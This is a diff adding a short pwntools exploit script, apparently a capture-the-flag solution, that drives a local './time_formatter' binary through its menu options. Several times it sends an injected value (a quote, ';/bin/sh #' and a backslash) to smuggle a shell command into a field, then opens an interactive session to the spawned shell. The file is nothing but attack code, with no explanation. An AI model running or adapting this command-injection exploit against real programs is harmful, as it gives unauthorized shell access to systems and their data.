@@ -1,0 +1,16 @@
+from pwn import *
+
+r=process('./time_formatter')
+pause()
+r.send("1" + "\n")
+r.send("%c" + "\n")
+r.send("3" + "\n")
+r.send("\'"+";/bin/sh #"+"\\" + "\n")
+r.send("5" + "\n")
+r.send("\n")
+r.send("3" + "\n")
+r.send("\'"+";/bin/sh #"+"\\" + "\n")
+r.send("3" + "\n")
+r.send("\'"+";/bin/sh #"+"\\" + "\n")
+r.send("4" + "\n")
+r.interactive()
